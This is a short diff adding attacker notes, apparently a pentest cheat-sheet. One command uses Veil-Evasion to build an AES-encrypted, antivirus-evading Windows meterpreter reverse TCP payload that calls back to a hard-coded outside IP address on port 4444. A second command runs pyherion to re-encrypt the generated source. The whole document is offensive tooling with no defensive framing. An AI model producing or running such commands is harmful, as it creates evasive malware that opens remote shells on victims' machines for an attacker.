@@ -1,0 +1,6 @@
+python Veil-Evasion.py -p python/shellcode_inject/aes_encrypt -o malwareEncrypted --msfvenom windows/meterpreter/reverse_tcp --msfoptions LHOST=35.167.75.66 LPORT=4444
+
+## Re encript content
+-- pyherion directory: /usr/share/veil-evasion/tools
+
+python pyherion.py /var/lib/veil-evasion/output/source/moonLight.py GogMoon.py
